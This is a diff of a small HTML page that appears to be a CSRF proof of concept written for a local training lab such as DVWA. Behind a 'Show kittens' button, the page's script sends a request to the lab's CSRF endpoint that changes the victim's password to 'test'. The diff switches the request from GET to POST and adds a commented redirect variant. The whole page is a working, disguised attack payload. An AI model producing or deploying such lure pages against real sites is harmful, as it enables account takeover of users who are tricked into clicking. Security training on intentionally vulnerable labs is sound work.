@@ -1,19 +1,20 @@
-    <!DOCTYPE html>
-    <html lang="en">
-        <head>
-            <meta charset="UTF-8">
-            <title>Fluffy kittens</title>
-            <script type="application/javascript">
-                function showKittens() {
-                    const http = new XMLHttpRequest();
-                    http.open("GET", "http://localhost:8080/vulnerabilities/csrf/?" +
-                        "password_new=test&password_conf=test&Change=Change");
-                    http.send();
-                    http.onload = () => console.log(http.responseText);
-                }
-            </script>
-        </head>
-        <body>
-            <button onclick="showKittens()">Show kittens</button>
-        </body>
-    </html>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Fluffy kittens</title>
+    <script type="application/javascript">
+        function showKittens() {
+            // window.location = "http://localhost:8080/vulnerabilities/csrf/?password_new=test&password_conf=test&Change=Change"
+            const http = new XMLHttpRequest();
+            http.open("POST", "http://localhost:8080/vulnerabilities/csrf/?" +
+                "password_new=test&password_conf=test&Change=Change");
+            http.send();
+            http.onload = () => console.log(http.responseText);
+        }
+    </script>
+</head>
+<body>
+<button onclick="showKittens()">Show kittens</button>
+</body>
+</html>
